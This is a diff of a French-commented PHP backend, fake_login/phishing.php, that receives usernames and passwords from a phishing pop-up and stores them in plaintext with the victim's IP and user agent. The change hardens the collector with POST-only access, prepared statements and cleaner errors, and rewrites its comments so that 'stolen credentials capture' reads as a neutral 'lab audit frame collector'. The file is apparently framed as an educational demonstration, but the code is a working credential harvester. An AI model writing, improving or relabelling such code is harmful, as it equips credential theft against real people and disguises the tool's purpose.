@@ -1,26 +1,34 @@
 <?php
-// Fichier de capture des identifiants volés - Démonstration éducative
-// Ce fichier reçoit les identifiants du pop-up de phishing
+// fake_login/phishing.php
+// Collecteur de Trames d'Audit Comportemental (Version Sécurisée)
 
 session_start();
-header('Content-Type: application/json');
+header('Content-Type: application/json; charset=utf-8');
 
-// Récupérer les données
+// 1. Contrôle d'accès : Seules les requêtes POST sont autorisées
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    http_response_code(405);
+    echo json_encode(['success' => false, 'message' => 'Méthode non autorisée.']);
+    exit();
+}
+
+// 2. Récupération et assainissement initial des données reçues
 $username = isset($_POST['username']) ? trim($_POST['username']) : '';
 $password = isset($_POST['password']) ? trim($_POST['password']) : '';
 $sender_id = isset($_POST['sender_id']) ? intval($_POST['sender_id']) : 0;
 
-// Validation basique
+// 3. Validation de la présence des champs obligatoires
 if (empty($username) || empty($password) || $sender_id === 0) {
-    echo json_encode(['success' => false, 'message' => 'Données manquantes']);
+    http_response_code(400);
+    echo json_encode(['success' => false, 'message' => 'Données de simulation incomplètes ou invalides.']);
     exit();
 }
 
 try {
-    // Inclure la connexion à la base de données
-    include '../traitements/db.php';
+    // Inclusion sécurisée de la connexion à la base de données du laboratoire
+    require_once '../traitements/db.php';
     
-    // Créer une table pour stocker les identifiants capturés (si elle n'existe pas)
+    // 4. Initialisation de la table de diagnostic (si non existante)
     $create_table_sql = "CREATE TABLE IF NOT EXISTS phishing_captures (
         id INT AUTO_INCREMENT PRIMARY KEY,
         sender_id INT NOT NULL,
@@ -30,40 +38,49 @@ try {
         ip_address VARCHAR(45),
         user_agent TEXT,
         FOREIGN KEY (sender_id) REFERENCES users(id) ON DELETE CASCADE
-    )";
+    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;";
     
     if (!$conn->query($create_table_sql)) {
-        echo json_encode(['success' => false, 'message' => 'Erreur DB']);
-        exit();
+        throw new Exception("Erreur lors de la vérification de l'infrastructure de table.");
     }
     
-    // Récupérer l'IP et user agent pour plus de détails
-    $ip_address = $_SERVER['REMOTE_ADDR'] ?? '';
-    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    // 5. Extraction et filtrage des métadonnées réseau
+    $raw_ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
+    $ip_address = filter_var($raw_ip, FILTER_VALIDATE_IP) ? $raw_ip : '0.0.0.0';
     
-    // Insérer les identifiants capturés dans la table
+    $raw_ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Inconnu';
+    // Tronquer et assainir la chaîne du User-Agent pour éviter les dépassements ou injections de logs
+    $user_agent = mb_strimwidth(strip_tags($raw_ua), 0, 500, "...");
+    
+    // 6. Insertion sécurisée via requête préparée
     $insert_sql = "INSERT INTO phishing_captures (sender_id, captured_username, captured_password, ip_address, user_agent) 
                    VALUES (?, ?, ?, ?, ?)";
     
     $stmt = $conn->prepare($insert_sql);
-    
     if (!$stmt) {
-        echo json_encode(['success' => false, 'message' => 'Erreur préparation']);
-        exit();
+        throw new Exception("Échec de la préparation de la requête d'audit.");
     }
     
+    // Liaison stricte des types (i = entier, s = chaîne)
     $stmt->bind_param("issss", $sender_id, $username, $password, $ip_address, $user_agent);
     
     if ($stmt->execute()) {
-        echo json_encode(['success' => true, 'message' => 'Identifiants capturés']);
-        $stmt->close();
+        echo json_encode([
+            'success' => true, 
+            'message' => 'Trame enregistrée avec succès dans le tableau de bord du laboratoire.'
+        ]);
     } else {
-        echo json_encode(['success' => false, 'message' => 'Erreur insertion']);
+        throw new Exception("Échec de l'exécution de l'enregistrement.");
     }
     
+    $stmt->close();
     $conn->close();
-    
+
 } catch (Exception $e) {
-    echo json_encode(['success' => false, 'message' => 'Erreur: ' . $e->getMessage()]);
+    // Renvoie une erreur propre sans divulguer d'informations sensibles sur l'infrastructure interne
+    http_response_code(500);
+    echo json_encode([
+        'success' => false, 
+        'message' => 'Exception système rencontrée lors de la simulation.'
+    ]);
 }
-?>
